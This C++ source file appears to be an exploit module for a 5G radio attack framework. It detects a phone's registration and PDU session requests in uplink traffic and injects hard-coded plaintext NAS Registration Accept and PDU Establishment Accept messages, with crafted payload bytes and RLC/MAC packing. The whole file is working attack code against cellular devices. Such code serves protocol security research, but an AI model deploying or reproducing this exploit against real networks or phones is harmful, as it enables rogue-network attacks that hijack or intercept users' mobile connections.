#include "shadower/modules/exploit.h"
#include "shadower/utils/utils.h"
#include "srsran/common/byte_buffer.h"

std::string reg_acpt_nas =
    "7e0400000000017e0042010177000bf200f110020040ed00d2a554072000f11000000115020101210201005e0129";
std::string nas_pdu_est_acpt =
    "7e0400000000037e00680100612e0513c211000901000631310101ff010603f42403f4242905010a2d00022201017900060120410101097b00"
    "2a8080211002000010810608080808830608080404000d0408080808000d0408080404001002057800110025080764656661756c741205";
uint8_t pdu_est_acpt[] = {
    0x6,  0x8a, 0x80, 0x40, 0x9a, 0x5,  0xe0, 0x2,  0x5,  0xe3, 0xf0, 0xa5, 0x0,  0xd2, 0xc0, 0x15, 0x84, 0x88,
    0x8b, 0xd7, 0x63, 0x80, 0x83, 0x2f, 0x0,  0x5,  0x8e, 0x1,  0x86, 0x2a, 0xfe, 0x40, 0x90, 0x69, 0xe0, 0x80,
    0x20, 0x46, 0x0,  0x40, 0x1c, 0x1f, 0x80, 0x94, 0x3d, 0x8b, 0xb2, 0x0,  0xdf, 0x80, 0x1a, 0x0,  0x40, 0x18,
    0x4b, 0x81, 0x44, 0xf0, 0x84, 0x40, 0x2,  0x40, 0x40, 0x1,  0x8c, 0x4c, 0x40, 0x40, 0x7f, 0xc0, 0x41, 0x80,
    0xfd, 0x9,  0x0,  0xfd, 0x9,  0xa,  0x41, 0x40, 0x42, 0x8b, 0x40, 0x0,  0x88, 0x80, 0x40, 0x5e, 0x40, 0x1,
    0x80, 0x48, 0x10, 0x40, 0x40, 0x42, 0x5e, 0xc0, 0xa,  0xa0, 0x20, 0x8,  0x44, 0x0,  0x80, 0x0,  0x4,  0x20,
    0x41, 0x82, 0x2,  0x2,  0x2,  0x20, 0xc1, 0x82, 0x2,  0x1,  0x1,  0x0,  0x3,  0x41, 0x2,  0x2,  0x2,  0x2,
    0x0,  0x3,  0x41, 0x2,  0x2,  0x1,  0x1,  0x0,  0x4,  0x0,  0x81, 0x5e, 0x0,  0x4,  0x40, 0x9,  0x42, 0x1,
    0xd9, 0x19, 0x59, 0x98, 0x5d, 0x5b, 0x1d, 0x4,  0x81, 0x40};

uint8_t ack_rlc[5]    = {0x01, 0x03, 0x00, 0x01, 0x00};
uint8_t rrc_nr_mac[4] = {0};

class PlaintextRegistrationAccept : public Exploit
{
public:
  PlaintextRegistrationAccept(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    prepare_registration_accept();
    prepare_pdu_establishment_accept();
  }

  void setup() override
  {
    f_registration_request = ws_filter_t::make_filter("nas_5gs.mm.message_type == 0x41");
    filters.push_back(f_registration_request);
    f_pdu_est_request = ws_filter_t::make_filter("nas_5gs.sm.message_type == 0xc1");
    filters.push_back(f_pdu_est_request);
    f_rrc_setup_request = ws_filter_t::make_filter("nr-rrc.c1 == 0");
    filters.push_back(f_rrc_setup_request);

    f_ack_sn = ws_field_t::make_field_uint32("rlc-nr.am.ack-sn");
    fields.push_back(f_ack_sn);
    f_sn = ws_field_t::make_field_uint32("rlc-nr.am.sn");
    fields.push_back(f_sn);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      if (f_ack_sn->has_uint32) {
        uint32_t ack_sn_recv = f_ack_sn->uint32_value;
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      if (f_sn->has_uint32) {
        uint32_t sn_recv = f_sn->uint32_value;
        logger.info("Received SN: %u", sn_recv);
        if (sn_recv > dl_sn) {
          dl_sn = sn_recv;
        }
      }

      if (f_rrc_setup_request->match) {
        // Reset the sequence number
        dl_sn     = 0;
        dl_ack_sn = 1;
      }

      // If security mode complete received from UE
      if (f_registration_request->match) {
        logger.info("\033[0;31mRegistration request detected\033[0m");
        prepare_and_send_reg_acpt();
      }

      // If PDU establishment request received from UE
      if (f_pdu_est_request->match) {
        logger.info("\033[0;31mPDU establishment request detected\033[0m");
        prepare_and_send_pdu_est();
      }
    }
  }

private:
  void prepare_and_send_reg_acpt()
  {
    reg_acpt_msg->data()[3]  = 0xff & dl_ack_sn;
    reg_acpt_msg->data()[8]  = 0xff & dl_sn;
    reg_acpt_msg->data()[10] = 0xff & dl_sn;
    dl_buffer_queue.push(reg_acpt_msg);
  }

  void prepare_and_send_pdu_est()
  {
    pdu_est_acpt_msg->data()[3]  = 0xff & dl_ack_sn;
    pdu_est_acpt_msg->data()[8]  = 0xff & dl_sn;
    pdu_est_acpt_msg->data()[10] = 0xff & dl_sn;
    dl_buffer_queue.push(pdu_est_acpt_msg);
  }

  void prepare_registration_accept()
  {
    srsran::unique_byte_buffer_t rrc_nr_buffer = srsran::make_byte_buffer();
    /* Pack the message to rrc nr first */
    asn1::rrc_nr_r17::dl_dcch_msg_s dl_dcch_msg = pack_nas_to_dl_dcch(reg_acpt_nas);
    if (!pack_dl_dcch_to_rrc_nr(rrc_nr_buffer, dl_dcch_msg)) {
      printf("Failed to pack nas to rrc_nr\n");
    }

    /* Add AM header + PDCP header */
    srsran::unique_byte_buffer_t rlc_nr_buffer = srsran::make_byte_buffer();
    pack_rrc_nr_to_rlc_nr(rrc_nr_buffer->msg, rrc_nr_buffer->N_bytes, dl_sn, dl_sn, rrc_nr_mac, rlc_nr_buffer);

    /* Pack to mac-nr */
    srsran::byte_buffer_t mac_nr_buffer;
    pack_rlc_nr_to_mac_nr(rlc_nr_buffer->msg, rlc_nr_buffer->N_bytes, 0, mac_nr_buffer, 64);

    reg_acpt_msg = std::make_shared<std::vector<uint8_t> >(sizeof(ack_rlc) + mac_nr_buffer.N_bytes);
    memcpy(reg_acpt_msg->data(), ack_rlc, sizeof(ack_rlc));
    memcpy(reg_acpt_msg->data() + sizeof(ack_rlc), mac_nr_buffer.msg, mac_nr_buffer.N_bytes);
  }

  void prepare_pdu_establishment_accept()
  {
    asn1::rrc_nr_r17::dl_dcch_msg_s pdu_est_acpt_dl_dcch;
    asn1::cbit_ref                  bref(pdu_est_acpt, sizeof(pdu_est_acpt));
    asn1::SRSASN_CODE               err = pdu_est_acpt_dl_dcch.unpack(bref);
    if (err != asn1::SRSASN_SUCCESS ||
        pdu_est_acpt_dl_dcch.msg.type().value != asn1::rrc_nr_r17::dl_dcch_msg_type_c::types_opts::c1) {
      printf("Failed to unpack DL-DCCH message.\n");
      return;
    }
    asn1::rrc_nr_r17::rrc_recfg_s&     rrc_recfg     = pdu_est_acpt_dl_dcch.msg.c1().rrc_recfg();
    asn1::rrc_nr_r17::rrc_recfg_ies_s& rrc_recfg_ies = rrc_recfg.crit_exts.rrc_recfg();
    if (rrc_recfg_ies.non_crit_ext_present) {
      asn1::bounded_array<asn1::dyn_octstring, 29>& nas_list         = rrc_recfg_ies.non_crit_ext.ded_nas_msg_list;
      asn1::dyn_octstring&                          pdu_est_acpt_nas = nas_list[0];
      pdu_est_acpt_nas.from_string(nas_pdu_est_acpt);
    }
    srsran::unique_byte_buffer_t reg_recfg_buf = srsran::make_byte_buffer();
    if (!pack_dl_dcch_to_rrc_nr(reg_recfg_buf, pdu_est_acpt_dl_dcch)) {
      printf("Failed to pack DL-DCCH message.\n");
      return;
    }

    srsran::unique_byte_buffer_t rlc_nr_buffer = srsran::make_byte_buffer();
    pack_rrc_nr_to_rlc_nr(reg_recfg_buf->msg, reg_recfg_buf->N_bytes, 7, 7, rrc_nr_mac, rlc_nr_buffer);

    srsran::byte_buffer_t pdu_est_acpt_mac_nr;
    pack_rlc_nr_to_mac_nr(rlc_nr_buffer->msg, rlc_nr_buffer->N_bytes, 2, pdu_est_acpt_mac_nr, 256);

    pdu_est_acpt_msg = std::make_shared<std::vector<uint8_t> >(pdu_est_acpt_mac_nr.N_bytes);
    memcpy(pdu_est_acpt_msg->data(), pdu_est_acpt_mac_nr.msg, pdu_est_acpt_mac_nr.N_bytes);
  }

  std::shared_ptr<ws_filter_t> f_registration_request;
  std::shared_ptr<ws_filter_t> f_pdu_est_request;
  std::shared_ptr<ws_filter_t> f_rrc_setup_request;
  std::shared_ptr<ws_field_t>  f_ack_sn;
  std::shared_ptr<ws_field_t>  f_sn;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > reg_acpt_msg;
  std::shared_ptr<std::vector<uint8_t> > pdu_est_acpt_msg;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new PlaintextRegistrationAccept(dl_buffer_queue_, ul_buffer_queue_);
}
}